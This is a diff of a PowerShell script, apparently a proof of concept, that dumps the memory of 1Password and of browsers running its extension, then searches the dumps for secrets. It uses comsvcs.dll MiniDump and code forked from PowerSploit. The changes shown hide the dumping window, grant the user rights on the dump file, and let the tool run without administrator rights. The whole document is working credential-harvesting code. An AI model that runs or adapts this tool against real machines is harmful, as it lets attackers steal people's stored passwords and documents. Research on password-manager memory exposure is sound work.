@@ -5,9 +5,20 @@
     The 1Password password manager client keeps a lot of sensitive information in memory, such as credentials or any other type of document saved within the database.
 .NOTES
     Author:  Tiziano Marra (https://github.com/MrTiz)
-    Date:    2023-05-27
-    Version: 2.0
+    Date:    2023-06-09
+    Version: 2.1
 #>
+
+#########################################################
+
+function ReRunAsAdministrator() {
+    $ElevatedProcess = New-Object System.Diagnostics.ProcessStartInfo 'PowerShell';
+    $ElevatedProcess.Arguments = "& '" + $script:MyInvocation.MyCommand.Path + "'"
+    $ElevatedProcess.Verb = 'runas'
+
+    [System.Diagnostics.Process]::Start($ElevatedProcess)
+    Exit
+}
 
 #########################################################
 
@@ -15,19 +26,18 @@ function CheckIfRunAsAdministrator() {
     $CurrentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
 
     if (-Not $CurrentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
-    	$ElevatedProcess = New-Object System.Diagnostics.ProcessStartInfo 'PowerShell';
-        $ElevatedProcess.Arguments = "& '" + $script:MyInvocation.MyCommand.Path + "'"
-        $ElevatedProcess.Verb = 'runas'
-
-        [System.Diagnostics.Process]::Start($ElevatedProcess)
-        Exit
+        return $False
+    	#ReRunAsAdministrator
+    }
+    else {
+        return $True
     }
 }
 
 #########################################################
 
 # Forked from https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
-# ON WINDOWS 11 REQUIRES 'NT AUTHORITY\SYSTEM' PERMISSIONS
+# DEPRECATED: THIS FUNCTION, ON WINDOWS 11, REQUIRES 'NT AUTHORITY\SYSTEM' PRIVILEGES
 function Out-Minidump {
     [CmdletBinding()]
     Param (
@@ -85,7 +95,7 @@ function dumpProcessMemory {
     $runDll = 'C:\Windows\System32\rundll32.exe'
     $params = "C:\Windows\System32\comsvcs.dll MiniDump $ProcessId $DumpFileName full"
 
-    Start-Process -FilePath $runDll -WorkingDirectory $WorkingDirectory -ArgumentList $params -Wait
+    Start-Process -FilePath $runDll -WorkingDirectory $WorkingDirectory -ArgumentList $params -Wait -WindowStyle Hidden
 }
 
 #########################################################
@@ -126,7 +136,23 @@ function checkExtensionInstalled {
 
 #########################################################
 
-CheckIfRunAsAdministrator
+function fixPermissions {
+    [CmdletBinding()]
+    Param (
+        [Parameter(Mandatory = $True)][ValidateScript({ Test-Path $_ })][String]$DumpFilePath
+    )
+
+    $icaclsPath = 'C:\Windows\System32\icacls.exe'
+    Start-Process -FilePath $icaclsPath -ArgumentList "`"$DumpFilePath`" /grant `"$env:USERNAME`":F" -Wait -WindowStyle Hidden
+}
+
+#########################################################
+
+$IsAdmin = CheckIfRunAsAdministrator
+
+if (-not $IsAdmin) {
+    Write-Warning "$($MyInvocation.MyCommand.Name) is running with non-administrative privileges! The outputs may be uninteresting or inaccurate.`n"
+}
 
 $Folder   = $env:TEMP
 $FileName = 'tmp1P.dmp'
@@ -153,20 +179,30 @@ $ProcessesBrwExt = @('brave', 'firefox', 'msedge', 'chrome')
 $Processes = @()
 
 foreach ($Client in $ProcessesClient) {
-    $Processes += , (Get-Process -Name $Client -ErrorAction SilentlyContinue)
+    $Processes += Get-Process -Name $Client -ErrorAction SilentlyContinue
 }
 
 foreach ($Browser in $ProcessesBrwExt) {
     if (checkExtensionInstalled -ProcessName $Browser) {
-        $Processes += , (Get-Process -Name $Browser -ErrorAction SilentlyContinue)
+        $Processes += Get-Process -Name $Browser -ErrorAction SilentlyContinue
     }
 }
 
-foreach ($ProcessId in $Processes.Id) {
-    dumpProcessMemory -ProcessId $ProcessId -DumpFileName $FileName -WorkingDirectory $Folder
+$i = 0
+
+foreach ($Process in $Processes) {
+    $PercentCompleted = [Math]::Round(($i / $Processes.Count) * 100)
+    Write-Progress -Activity "Dumping '$($Process.ProcessName) ($($Process.Id))'" -Status "$i of $($Processes.Count) completed - $PercentCompleted%" -PercentComplete $PercentCompleted -SecondsRemaining -1
+
+    dumpProcessMemory -ProcessId $Process.Id -DumpFileName $FileName -WorkingDirectory $Folder
 
     if (-not (Test-Path -Path $FullPath -PathType Leaf)) {
+        $i++
         continue
+    }
+
+    if (-not $IsAdmin) {
+        fixPermissions -DumpFilePath $FullPath
     }
 
     Select-String -Path $FullPath -Pattern $Pattern -AllMatches | 
@@ -211,4 +247,5 @@ foreach ($ProcessId in $Processes.Id) {
         }
 
     Remove-Item -Path $FullPath -Force -ErrorAction SilentlyContinue
+    $i++
 }
